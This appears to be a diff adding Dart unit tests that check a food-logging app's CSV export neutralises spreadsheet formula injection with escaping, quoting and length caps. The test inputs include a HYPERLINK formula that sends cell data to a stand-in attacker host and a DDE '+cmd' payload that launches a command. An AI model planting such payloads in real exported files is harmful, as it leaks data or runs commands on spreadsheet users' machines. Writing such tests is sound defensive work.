@@ -88,6 +88,122 @@ void main() {
       expect(lines.length, 3);
     });
 
+    group('N2: formula injection', () {
+      FoodEntry entryWith({
+        required String name,
+        String ref = 'ref-1',
+        String unit = 'g',
+        String label = '1 g',
+        num low = 1,
+        num high = 2,
+      }) => FoodEntry(
+        id: 1,
+        plateLogId: 1,
+        databaseFood: DatabaseFood(
+          sourceRef: ref,
+          displayName: name,
+          source: SourceCatalog.manual,
+        ),
+        quantity: QuantityRange(
+          low: low,
+          high: high,
+          unit: unit,
+          displayLabel: label,
+        ),
+      );
+
+      String row(FoodEntry e) {
+        final csv = serializePlatesToCsv([
+          _plate(1, DateTime(2026, 8, 16, 9), [e]),
+        ]);
+        return csv.substring(kCsvHeader.length + 1);
+      }
+
+      test('=HYPERLINK(...) is neutralised with a leading apostrophe', () {
+        final r = row(
+          entryWith(name: '=HYPERLINK("http://evil.example/?x="&A1,"click")'),
+        );
+        expect(
+          r,
+          contains('"\'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"'),
+        );
+        expect(r, isNot(contains(',=HYPERLINK')));
+        expect(r, isNot(contains('"=HYPERLINK')));
+      });
+
+      test('+cmd, @SUM, -2+3, TAB and CR prefixes are all neutralised', () {
+        for (final name in [
+          '+cmd|\' /C calc\'!A0',
+          '@SUM(1+1)',
+          '-2+3',
+          '\t=1+1',
+          '\r=1+1',
+          '=1+1',
+        ]) {
+          final r = row(entryWith(name: name));
+          final cells = _splitCsvRow(r.trimRight());
+          final cell = cells[5]; // database_food_display_name
+          expect(cell, startsWith("'"), reason: name);
+          expect(cell.substring(1), name);
+        }
+      });
+
+      test('every TEXT column is neutralised (ref, unit, label)', () {
+        final r = row(
+          entryWith(name: 'ok', ref: '=ref', unit: '@unit', label: '+label'),
+        );
+        final cells = _splitCsvRow(r.trimRight());
+        expect(cells[4], "'=ref");
+        expect(cells[8], "'@unit");
+        expect(cells[9], "'+label");
+      });
+
+      test('numeric quantity columns stay NUMBERS (negative, decimal)', () {
+        final r = row(entryWith(name: 'ok', low: -2, high: 0.5));
+        final cells = _splitCsvRow(r.trimRight());
+        expect(cells[6], '-2');
+        expect(cells[7], '0.5');
+        expect(r, isNot(contains("'-2")));
+      });
+
+      test('ordinary text and hyphens inside the text are untouched', () {
+        final r = row(entryWith(name: 'Rice - brown', label: '1–2 fists'));
+        final cells = _splitCsvRow(r.trimRight());
+        expect(cells[5], 'Rice - brown');
+        expect(cells[9], '1–2 fists');
+      });
+
+      test('whitespace before the operator does not hide a formula', () {
+        for (final name in [' =1+1', '  +cmd', '\u00A0@SUM(A1)', '\n=1+1']) {
+          final cell = _splitCsvRow(row(entryWith(name: name)).trimRight())[5];
+          expect(cell, startsWith("'"), reason: name);
+        }
+      });
+
+      test('full-width operators are neutralised', () {
+        for (final name in ['＝1+1', '＋cmd', '－2', '＠SUM(A1)', ' ＝1']) {
+          final cell = _splitCsvRow(row(entryWith(name: name)).trimRight())[5];
+          expect(cell, startsWith("'"), reason: name);
+        }
+      });
+
+      test('fields containing ; or TAB are quoted', () {
+        expect(row(entryWith(name: 'a;b')), contains('"a;b"'));
+        expect(row(entryWith(name: 'a\tb')), contains('"a\tb"'));
+      });
+
+      test('a field containing CR is quoted', () {
+        final r = row(entryWith(name: 'a\rb'));
+        expect(r, contains('"a\rb"'));
+      });
+
+      test('field length is capped', () {
+        final r = row(entryWith(name: 'x' * 5000));
+        final cells = _splitCsvRow(r.trimRight());
+        expect(cells[5].length, kMaxCsvFieldLength);
+      });
+    });
+
     test('readPlates visibleDay filters to the local day', () async {
       final store = _FakeStore([
         _plate(1, DateTime(2026, 8, 16, 9), [_entry(1, 1, 'A')]),
@@ -149,4 +265,36 @@ void main() {
       expect(r, isA<ExportFormatFailure>());
     });
   });
+}
+
+/// Minimal RFC-4180 row splitter for the tests (handles quotes, doubled
+/// quotes, embedded commas / newlines).
+List<String> _splitCsvRow(String row) {
+  final cells = <String>[];
+  final cur = StringBuffer();
+  var quoted = false;
+  for (var i = 0; i < row.length; i++) {
+    final c = row[i];
+    if (quoted) {
+      if (c == '"') {
+        if (i + 1 < row.length && row[i + 1] == '"') {
+          cur.write('"');
+          i++;
+        } else {
+          quoted = false;
+        }
+      } else {
+        cur.write(c);
+      }
+    } else if (c == '"') {
+      quoted = true;
+    } else if (c == ',') {
+      cells.add(cur.toString());
+      cur.clear();
+    } else {
+      cur.write(c);
+    }
+  }
+  cells.add(cur.toString());
+  return cells;
 }
